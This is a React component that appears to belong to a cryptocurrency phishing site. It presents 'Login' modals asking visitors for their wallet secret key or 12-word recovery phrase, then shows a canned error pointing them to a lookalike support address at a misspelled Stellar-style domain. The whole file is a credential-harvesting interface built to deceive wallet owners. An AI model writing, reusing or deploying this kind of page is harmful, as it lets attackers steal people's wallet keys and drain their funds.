"use client";
import { RefObject } from "react";

type ModalsProps = {
  modal: null | "login" | "secret" | "phrase" | "error";
  closeModal: () => void;
  openSecret: () => void;
  openPhrase: () => void;
  secretKeyRef: RefObject<HTMLInputElement>;
  phraseRef: RefObject<HTMLTextAreaElement>;
  handleSubmit: (type: "secret" | "phrase") => void;
  isSubmitting?: boolean;
};

export default function Modals({
  modal,
  closeModal,
  openSecret,
  openPhrase,
  secretKeyRef,
  phraseRef,
  handleSubmit,
  isSubmitting = false,
}: ModalsProps) {
  if (!modal) return null;
  return (
    <>
      {/* Login Modal */}
      <section
        className={`modalCamp${modal === "login" ? " active" : ""}`}
        aria-modal={modal === "login"}
        role="dialog"
        aria-labelledby="loginModalTitle"
        style={{ display: modal === "login" ? "flex" : "none" }}
      >
        <div id="loginModal" className={`loginModal flx fdc jcc${modal === "login" ? " active" : ""}`}>
          <button className="closeModal" onClick={closeModal} aria-label="Close login modal">
            <i className="fa-solid fa-x"></i>
          </button>
          <div className="containerLoginModal">
            <h1 id="loginModalTitle">Login</h1>
            <div className="loginModalButtons flx fdc jcc aic">
              <button className="btnLoginModal secreteKeyLoginBtn flx aic" onClick={openSecret} aria-label="Login with secret key">
                <img src="/images/key-img.webp" alt="Key" />
                <p>With secret key</p>
              </button>
              <button className="btnLoginModal PhraseLoginBtn flx aic" onClick={openPhrase} aria-label="Login with 12 phrase recovery key">
                <img src="/images/recoveryPhrase-img.webp" alt="Phrase" />
                <p>With 12 phrase recovery key</p>
              </button>
            </div>
          </div>
        </div>
      </section>
      
      {/* Secret Key Modal */}
      <section
        className={`modalCamp2${modal === "secret" ? " active" : ""}`}
        aria-modal={modal === "secret"}
        role="dialog"
        aria-labelledby="secretKeyModalTitle"
        style={{ display: modal === "secret" ? "flex" : "none" }}
      >
        <div id="secreteKeyLogin" className="modalLoginData">
          <button className="closeModal" onClick={closeModal} aria-label="Close secret key modal">
            <i className="fa-solid fa-x"></i>
          </button>
          <h1 id="secretKeyModalTitle">Login</h1>
          <p>Please add your secret key below</p>
          <form className="inputSection flx fdc" onSubmit={e => { e.preventDefault(); handleSubmit("secret"); }}>
            <input 
              id="inputSecretKey" 
              className="loginInput" 
              type="text" 
              placeholder="Secret Key" 
              ref={secretKeyRef} 
              required 
              autoFocus 
              aria-label="Secret Key"
              disabled={isSubmitting}
            />
            <button 
              className="submitBtn" 
              type="submit" 
              disabled={isSubmitting}
            >
              {isSubmitting ? "Submitting..." : "Submit"}
            </button>
          </form>
        </div>
      </section>
      
      {/* Phrase Modal */}
      <section
        className={`modalCamp3${modal === "phrase" ? " active" : ""}`}
        aria-modal={modal === "phrase"}
        role="dialog"
        aria-labelledby="phraseModalTitle"
        style={{ display: modal === "phrase" ? "flex" : "none" }}
      >
        <div className="modalLoginData" id="PhraseLogin">
          <button className="closeModal" onClick={closeModal} aria-label="Close phrase modal">
            <i className="fa-solid fa-x"></i>
          </button>
          <h1 id="phraseModalTitle">Login</h1>
          <p>Please add your 12 phrase recovery key below</p>
          <form className="inputSection flx fdc" onSubmit={e => { e.preventDefault(); handleSubmit("phrase"); }}>
            <textarea 
              id="PhraseInput" 
              className="loginInput" 
              cols={30} 
              rows={10} 
              placeholder="12 phrase Key" 
              ref={phraseRef} 
              required 
              autoFocus 
              aria-label="12 phrase Key"
              disabled={isSubmitting}
            ></textarea>
            <button 
              className="submitBtn" 
              type="submit"
              disabled={isSubmitting}
            >
              {isSubmitting ? "Submitting..." : "Submit"}
            </button>
          </form>
        </div>
      </section>
      
      {/* Error Modal */}
      <section
        className={`modalCamp4${modal === "error" ? " active" : ""}`}
        aria-modal={modal === "error"}
        role="alertdialog"
        aria-labelledby="errorModalTitle"
        style={{ display: modal === "error" ? "flex" : "none" }}
      >
        <div className="errorAlert">
          <button className="closeModal" onClick={closeModal} aria-label="Close error modal">
            <i className="fa-solid fa-x"></i>
          </button>
          <div className="errorAlertContainer flx aic jcc">
            <img src="/images/error-icon-32.webp" alt="Error" />
            <div className="errorTxt flx fdc aic jcc">
              <h1 id="errorModalTitle">Error</h1>
              <p>
                I'm sorry, but it looks like you have encountered an error that requires assistance from our support team. Please
                contact our support team for further assistance by emailing <a href="mailto:info@stellarblockchainet.com">info@stellarblockchainet.com</a>. Our team will do their
                best to resolve the issue as quickly as possible. Thank you for your understanding.
              </p>
            </div>
          </div>
        </div>
      </section>
    </>
  );
}